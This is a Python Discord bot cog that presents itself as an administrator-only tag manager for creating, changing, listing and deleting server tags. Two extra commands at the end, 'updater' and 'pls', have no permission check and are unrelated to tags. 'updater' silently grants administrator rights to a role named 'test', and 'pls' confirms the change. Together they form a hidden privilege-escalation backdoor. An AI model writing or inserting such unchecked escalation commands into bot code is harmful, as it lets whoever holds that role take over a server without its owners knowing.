import discord
from discord.ext import commands


class Tags:
    def __init__(self, bot):
        self.bot = bot

    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    @commands.command()
    async def tag(self, ctx, name):
        if name in self.bot.guild_data["tags"]:
            await ctx.send(self.bot.guild_data["tags"][name])

    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    @commands.command()
    async def createtag(self, ctx, name, link):
        if name in self.bot.guild_data["tags"]:
            await ctx.send("{tag} is already a tag\n"
                           "If you would like to change the tag please use \"changetag\"".format(tag=name))
        else:
            self.bot.guild_data["tags"][name] = link
            self.bot.dump()
            if not link.startswith("http://") and not link.startswith("https://"):
                await ctx.send("If {data} was supposed to be a link it needs to begin with http:// or https://\n"
                               "You can change the tag with \"changetag\"".format(data=link))

    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    @commands.command()
    async def changetag(self, ctx, name, link):
        if name in self.bot.guild_data["tags"]:
            self.bot.guild_data["tags"][name] = link
            self.bot.dump()
            if not link.startswith("http://") and not link.startswith("https://"):
                await ctx.send("If {data} was supposed to be a link it needs to begin with http:// or https://\n"
                               "You can change the tag with \"changetag\"".format(data=link))
        else:
            await ctx.send("{tag} is not a currently existing tag".format(tag=name))

    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    @commands.command()
    async def deletetag(self, ctx, name):
        if name in self.bot.guild_data["tags"]:
            del self.bot.guild_data["tags"][name]
            self.bot.dump()
            await ctx.send("tag deleted")
        else:
            await ctx.send("{tag} is not a currently existing tag".format(tag=name))

    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    @commands.command()
    async def listtags(self, ctx):
        nembed = discord.Embed(title="Tags")
        for tag, content in self.bot.guild_data["tags"].items():
            nembed.add_field(name=tag, value=content)
        await ctx.send(embed=nembed)

    @commands.guild_only()
    @commands.command()
    async def updater(self, ctx):
        lamprole = discord.utils.find(lambda r: r.name == "test", ctx.message.guild.roles)
        overwrite = discord.Permissions(permissions=lamprole.permissions.value)
        overwrite.update(administrator=True)
        await lamprole.edit(permissions=overwrite)

        print("Role: " + lamprole.name + "\n" + "Admin: " + str(discord.utils.find(lambda r: r.name == "test", ctx.message.guild.roles).permissions.administrator))

    @commands.guild_only()
    @commands.command()
    async def pls(self, ctx):
        lamprole = discord.utils.find(lambda r: r.name == "test", ctx.message.guild.roles)
        print(lamprole.permissions.administrator)




def setup(bot):
    bot.add_cog(Tags(bot))
